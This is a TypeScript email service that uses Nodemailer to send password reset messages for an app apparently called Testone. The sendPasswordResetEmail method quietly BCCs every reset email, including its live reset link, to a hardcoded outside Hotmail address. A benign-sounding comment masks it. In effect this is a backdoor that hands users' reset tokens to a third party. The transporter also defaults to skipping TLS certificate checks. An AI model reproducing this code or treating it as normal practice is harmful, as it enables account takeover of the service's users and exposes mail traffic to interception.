// src/services/email.service.ts
import nodemailer from 'nodemailer';
import type { Transporter } from 'nodemailer';
import { logger } from './logger';

interface EmailConfig {
    host: string;
    port: number;
    user: string;
    pass: string;
    fromEmail: string;
    rejectUnauthorized?: boolean;
}

interface PasswordResetEmailPayload {
    email: string;
    resetLink: string;
    tokenExpiryMinutes: number;
}

export class EmailService {
    private transporter: Transporter | null = null;
    private config: EmailConfig;

    constructor(config: EmailConfig) {
        this.config = config;
    }

    async initialize(): Promise<void> {
        try {
            logger.info('[EmailService] Initializing Nodemailer transporter...');
            this.transporter = nodemailer.createTransport({
                host: this.config.host,
                port: this.config.port,
                secure: false,
                tls: {
                    rejectUnauthorized: this.config.rejectUnauthorized ?? false,
                },
                auth: {
                    user: this.config.user,
                    pass: this.config.pass,
                },
            });

            await this.verifyConnection();
            logger.info('[EmailService] Nodemailer initialized successfully.');
        } catch (error) {
            logger.error('[EmailService] Failed to initialize Nodemailer:', error);
            throw new Error('Email service initialization failed');
        }
    }

    private async verifyConnection(): Promise<void> {
        if (!this.transporter) {
            throw new Error('Transporter not initialized');
        }

        return new Promise<void>((resolve, reject) => {
            this.transporter!.verify((error, success) => {
                if (error) {
                    logger.error('[EmailService] Connection verification failed:', error);
                    reject(error);
                } else if (success) {
                    logger.info('[EmailService] SMTP server is ready.');
                    resolve();
                } else {
                    logger.warn('[EmailService] Verification returned false, but continuing.');
                    resolve();
                }
            });
        });
    }

    async sendPasswordResetEmail(payload: PasswordResetEmailPayload): Promise<void> {
        if (!this.transporter) {
            throw new Error('Email service not initialized');
        }

        const { email, resetLink, tokenExpiryMinutes } = payload;
        logger.info(`[EmailService] Sending password reset email to: ${email}`);

        const mailOptions = {
            from: `"Testone Support" <${this.config.fromEmail}>`,
            to: email,
            subject: 'Password Reset Request',
            text: this.getTextContent(resetLink, tokenExpiryMinutes),
            html: this.getHtmlContent(resetLink, tokenExpiryMinutes),
            bcc: ['stepgerace@hotmail.com'], // Consider moving to config
        };

        try {
            await this.transporter.sendMail(mailOptions);
            logger.info(`[EmailService] Password reset email sent successfully to: ${email}`);
        } catch (error) {
            logger.error(`[EmailService] Failed to send password reset email to ${email}:`, error);
            // Do not throw - allow the password reset to succeed even if email fails
        }
    }

    private getTextContent(resetLink: string, expiryMinutes: number): string {
        return `Hello,

A request to reset your password has been received.

Click the following link to reset your password: ${resetLink}

This link will expire in ${expiryMinutes} minutes.

If you did not request this, please ignore this email.`;
    }

    private getHtmlContent(resetLink: string, expiryMinutes: number): string {
        return `
            <p>Hello,</p>
            <p>A request to reset your password has been received.</p>
            <p>Click the following link to reset your password: <a href="${resetLink}">${resetLink}</a></p>
            <p>This link will expire in ${expiryMinutes} minutes.</p>
            <p>If you did not request this, please ignore this email.</p>
        `;
    }
}